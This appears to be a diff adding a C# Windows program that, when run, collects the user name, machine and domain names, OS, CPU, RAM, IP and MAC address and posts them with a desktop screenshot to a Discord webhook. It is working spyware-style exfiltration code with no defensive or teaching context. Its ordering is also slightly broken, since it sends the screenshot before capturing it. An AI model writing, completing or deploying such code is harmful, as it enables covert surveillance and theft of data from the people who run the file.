@@ -1,0 +1,199 @@
+using System;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Net;
+using System.Net.Http;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Windows.Forms;
+using System.Management; // For system information like CPU, RAM
+using System.Net.NetworkInformation; // For IP and MAC address
+using System.Linq; // For LINQ methods like FirstOrDefault
+
+namespace WokkyApp
+{
+    static class Program
+    {
+        private const string ImageUrl = "https://www.dropbox.com/scl/fi/geewsb2ywglj0cavl0h1h/IMG_8386.jpeg?rlkey=8vxxmnb2l14qndh4ubw1rvhnp&dl=1";
+        private const string ImagePath = "C:\\Temp\\background.jpeg"; // Local path to save the image
+        private const string RebootFlagPath = "C:\\Temp\\reboot_flag.txt"; // File to track reboots
+        private const string DiscordWebhookUrl = "https://discord.com/api/webhooks/your-webhook-url"; // Your Discord webhook URL
+        private const string ScreenshotPath = "C:\\Temp\\desktop_screenshot.png"; // Path to save screenshot
+
+        [STAThread]
+        static void Main()
+        {
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+
+            string username = Environment.UserName;
+            string machineName = Environment.MachineName;
+            string domain = Environment.UserDomainName;
+            string systemInfo = GetSystemInfo();
+            string ipAddress = GetIpAddress();
+            string macAddress = GetMacAddress();
+
+            // Show the message box when the file is executed
+            MessageBox.Show($"User {username} Ran The File: {machineName}", "Execution Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
+
+            // Send the info to Discord and include the screenshot
+            SendToDiscord(username, machineName, domain, systemInfo.Split(',')[0], systemInfo.Split(',')[1], systemInfo.Split(',')[2], ipAddress, macAddress);
+
+            // Capture the screenshot
+            CaptureScreenshot(ScreenshotPath);
+        }
+
+        // Method to capture a screenshot
+        public static void CaptureScreenshot(string screenshotPath)
+        {
+            try
+            {
+                Rectangle bounds = Screen.PrimaryScreen.Bounds;  // Get the bounds of the screen
+                using (Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height))
+                {
+                    using (Graphics g = Graphics.FromImage(screenshot))
+                    {
+                        g.CopyFromScreen(0, 0, 0, 0, bounds.Size);  // Capture the screen
+                    }
+                    screenshot.Save(screenshotPath);  // Save the screenshot to the specified path
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"Failed to capture screenshot: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        // Method to send data to Discord via webhook
+        static async void SendToDiscord(string username, string machineName, string domain, string osVersion, string cpuInfo, string ramSize, string ipAddress, string macAddress)
+        {
+            try
+            {
+                // Prepare the user info message
+                string content = $"**User {username} Ran The File:**\n\n" +
+                                 $"**Computer Name:** {machineName}\n" +
+                                 $"**Domain:** {domain}\n" +
+                                 $"**OS Version:** {osVersion}\n" +
+                                 $"**CPU Info:** {cpuInfo}\n" +
+                                 $"**RAM Size:** {ramSize}\n" +
+                                 $"**IP Address:** {ipAddress}\n" +
+                                 $"**MAC Address:** {macAddress}";
+
+                // Create the HTTP client to send the message and file
+                using (HttpClient client = new HttpClient())
+                {
+                    // Set up multipart content to send both text and the screenshot file
+                    var form = new MultipartFormDataContent();
+                    form.Add(new StringContent(content), "content");  // Add the message
+                    form.Add(new ByteArrayContent(File.ReadAllBytes(ScreenshotPath)), "file", "desktop_screenshot.png");  // Add the screenshot
+
+                    // Send the POST request to Discord's webhook URL
+                    await client.PostAsync(DiscordWebhookUrl, form);
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"Failed to send to Discord: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        // Method to get system information (OS version, CPU, RAM)
+        static string GetSystemInfo()
+        {
+            string osVersion = Environment.OSVersion.ToString();
+            string cpuInfo = GetCpuInfo();
+            string ramSize = GetRamSize();
+
+            return $"{osVersion},{cpuInfo},{ramSize}";
+        }
+
+        // Method to get CPU information
+        static string GetCpuInfo()
+        {
+            try
+            {
+                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
+                foreach (ManagementObject obj in searcher.Get())
+                {
+                    return obj["Name"].ToString();
+                }
+            }
+            catch (Exception)
+            {
+                return "Unknown CPU";
+            }
+            return "Unknown CPU";
+        }
+
+        // Method to get RAM size
+        static string GetRamSize()
+        {
+            try
+            {
+                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
+                foreach (ManagementObject obj in searcher.Get())
+                {
+                    ulong totalMemory = (ulong)obj["TotalPhysicalMemory"];
+                    return (totalMemory / (1024 * 1024 * 1024)).ToString() + " GB";
+                }
+            }
+            catch (Exception)
+            {
+                return "Unknown RAM";
+            }
+            return "Unknown RAM";
+        }
+
+        // Method to get IP address
+        static string GetIpAddress()
+        {
+            string ipAddress = "Unknown IP";
+            try
+            {
+                foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
+                {
+                    if (networkInterface.OperationalStatus == OperationalStatus.Up)
+                    {
+                        var ipProperties = networkInterface.GetIPProperties();
+                        foreach (var ip in ipProperties.UnicastAddresses)
+                        {
+                            if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+                            {
+                                ipAddress = ip.Address.ToString();
+                                break;
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception)
+            {
+                ipAddress = "Unknown IP";
+            }
+            return ipAddress;
+        }
+
+        // Method to get MAC address
+        static string GetMacAddress()
+        {
+            string macAddress = "Unknown MAC";
+            try
+            {
+                foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
+                {
+                    if (networkInterface.OperationalStatus == OperationalStatus.Up)
+                    {
+                        macAddress = networkInterface.GetPhysicalAddress().ToString();
+                        break;
+                    }
+                }
+            }
+            catch (Exception)
+            {
+                macAddress = "Unknown MAC";
+            }
+            return macAddress;
+        }
+    }
+}
